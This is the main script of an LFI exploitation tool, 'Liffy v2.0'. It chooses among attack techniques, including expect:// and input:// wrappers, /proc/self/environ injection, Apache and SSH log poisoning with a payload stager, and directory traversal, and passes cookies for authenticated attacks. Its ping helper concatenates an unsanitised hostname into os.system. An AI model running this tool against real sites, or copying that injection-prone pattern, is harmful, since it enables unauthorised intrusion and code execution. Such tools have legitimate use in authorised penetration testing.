#!/usr/bin/python

import argparse, os, signal, sys, urllib.parse

from pyfiglet import figlet_format

from core import Expect, Filter, Input, accesslog, data, proc, sshlog, DirTraversal
from core.utils import colors


def ping(hostname):
    """Ping the host to check if it's up or down

    Arguments:
        hostname {str} -- hostname to ping

    Returns:
        bool -- Tell if host is up or not
    """
    resp = os.system("ping -c 1 -W2 "+hostname+" > /dev/null 2>&1")
    return resp == 0


def signal_handler(signal, frame):
    print(colors('\n\nYou pressed Ctrl+C!', 91))
    sys.exit(0)


def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="URL to test for LFI")
    parser.add_argument("-d", "--data", help="Use data:// technique", action="store_true")
    parser.add_argument("-i", "--input", help="Use input:// technique", action="store_true")
    parser.add_argument("-e", "--expect", help="Use expect:// technique", action="store_true")
    parser.add_argument("-f", "--filter", help="Use filter:// technique", action="store_true")
    parser.add_argument("-p", "--proc", help="Use /proc/self/environ technique", action="store_true")
    parser.add_argument("-a", "--access", help="Apache access logs technique", action="store_true")
    parser.add_argument("-ns", "--nostager", help="execute payload directly, do not use stager", action="store_true")
    parser.add_argument("-r", "--relative", help="use path traversal sequences for attack", action="store_true")
    parser.add_argument("--ssh", help="SSH auth log poisoning", action="store_true")
    parser.add_argument("-l", "--location", help="path to target file (access log, auth log, etc.)")
    parser.add_argument("--cookies", help="session cookies for authentication")
    parser.add_argument('-dt', "--directorytraverse", help="Test for Directory Traversal", action="store_true")

    # Show the help message if the user does not provide any arguments.
    args = parser.parse_args(args=None if sys.argv[1:] else ['--help'])

    url = args.url
    nostager = args.nostager
    relative = args.relative
    cookies = args.cookies

    parsed = urllib.parse.urlsplit(url)

    print(colors("[~] Checking Target: {0}".format(parsed.netloc), 93))

    # if ping(parsed.netloc):
    #     print(colors("[+] Target looks alive ", 92))
    # else:
    #     print(colors("[!] Target irresponsive ", 91))
    #     sys.exit(1)

    if not parsed.query:
        print(colors("[!] No GET parameter Provided ", 91))

    # TODO: Find a better way to do these checks
    if args.data:
        print(colors("[~] Testing with data:// ", 93))
        data.Data(url, nostager, cookies).execute_data()
    elif args.input:
        print(colors("[~] Testing with input:// ", 93))
        Input.Input(url, nostager, cookies).execute_input()
    elif args.expect:
        print(colors("[~] Testing with expect:// ", 93))
        Expect.Expect(url, nostager, cookies).execute_expect()
    elif args.proc:
        print(colors("[~] /proc/self/environ Technique Selected!", 93))
        proc.Environ(url, nostager, relative, cookies).execute_environ()
    elif args.access:
        print(colors("[~] Testing for Apache access.log poisoning", 93))
        if not args.location:
            print(colors("[~] Log Location Not Provided! Using Default", 93))
            l = '/var/log/apache2/access.log'
        else:
            l = args.location
        accesslog(url, l, nostager, relative, cookies).execute_logs()
    elif args.ssh:
        print(colors("[~] Testing for SSH log poisoning ", 93))
        if not args.location:
            print(colors("[~] Log Location Not Provided! Using Default", 93))
            l = '/var/log/auth.log'
        else:
            l = args.location
        sshlog.SSHLogs(url, l, relative, cookies).execute_ssh()
    elif args.filter:
        print(colors("[~] Testing with expect://", 93))
        Filter.Filter(url, cookies).execute_filter()
    elif args.directorytraverse:
        print(colors("[~] Testing for directory traversal", 93))
        DirTraversal.dirTraversal(url, input(colors("[*] Please give a payload file for testing Directory Traversl: ", 91)), True).execute_dirTraversal()
    else:
        print(colors("[!] Please select atleast one technique to test", 91))
        sys.exit(0)

if __name__ == "__main__":
    signal.signal(signal.SIGINT, signal_handler)
    print(colors(figlet_format('Liffy v2.0', font='big'), 92), "\n")
    main()
